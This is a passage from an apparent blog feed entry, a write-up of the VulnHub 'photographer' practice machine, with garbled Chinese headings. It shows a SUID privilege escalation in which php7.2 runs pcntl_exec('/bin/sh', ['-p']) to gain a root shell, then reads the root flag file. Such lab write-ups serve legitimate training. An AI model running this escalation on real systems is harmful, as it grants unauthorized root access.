data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvcGhwLw==">ææƒå‚è€ƒ<i class="fa fa-external-link-alt"></i></span></p><p><code>æ‰¾åˆ°php7.2å‘½ä»¤çš„ç›®å½•ï¼Œåœ¨/usr/bin/php7.2</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/$ whereis php7.2</span><br><span class="line">php7: /usr/bin/php7.2 /usr/share/php7.2-mysql /usr/share/php7.2-opcache /usr/share/php7.2-xmlrpc /usr/share/php7.2-json /usr/share/php7.2-readline /usr/share/php7.2-curl /usr/share/php7.2-common /usr/share/php7.2-sqlite3 /usr/share/php7.2-zip /usr/share/php7.2-intl /usr/share/php7.2-xml /usr/share/php7.2-gd /usr/share/php7.2-mbstring</span><br><span class="line">www-data@photographer:/$ </span><br></pre></td></tr></table></figure><p><code>exploit</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">www-data@photographer:/usr/bin$ ./php7.2 -r &quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="comment"># id</span></span></span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)</span><br><span class="line"><span class="meta">#</span><span class="bash"> whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">pwd</span></span></span><br><span class="line">/usr/bin</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> ~  </span></span><br><span class="line">/bin/sh: 5: cd: can&#x27;t cd to ~</span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">proof.txt</span><br><span class="line"><span class="meta">#</span><span class="bash"> cat proof.txt</span></span><br><span class="line">                                                                   </span><br><span class="line">                                .:/://::::///:-`                                </span><br><span class="line">                            -/++:+`:--:o:  oo.-/+/:`                            </span><br><span class="line">                         -++-.`o++s-y:/s: `sh:hy`:-/+:`                         </span><br><span class="line">                       :o:``oyo/o`. `      ```/-so:+--+/`                       </span><br><span class="line">                     -o:-`yh//.                 `./ys/-.o/                      </span><br><span class="line">                    ++.-ys/:/y-                  /s-:/+/:/o`                    </span><br><span class="line">                   o/ :yo-:hNN                   .MNs./+o--s`                   </span><br><span class="line">                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s                   </span><br><span class="line">                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/                  </span><br><span class="line">                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h                  </span><br><span class="line">                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s.                 </span><br><span class="line">                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +-                 </span><br><span class="line">                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o.                 </span><br><span class="line">                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h`                 </span><br><span class="line">                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o                  </span><br><span class="line">                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`                  </span><br><span class="line">                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-                   </span><br><span class="line">                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.                    </span><br><span class="line">                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`                     </span><br><span class="line">                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-                       </span><br><span class="line">                        ./+:`:yh:dso/.+-++++ss+h++.:++-                         </span><br><span class="line">                           -/+/-:-/y+/d:yh-o:+--/+/:`                           </span><br><span class="line">                              `-///////////////:`                               </span><br><span class="line">                                                                                </span><br><span class="line"></span><br><span class="line">Follow me at: http://v1n1v131r4.com</span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"><span class="meta">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-å®˜ç½‘æè¿°&quot;&gt;&lt;a href=&quot;#0x00-å®˜ç½‘æè¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.å®˜ç½‘æè¿°&quot;&gt;&lt;/a&gt;0x00.å®˜ç½‘æè¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
</feed>
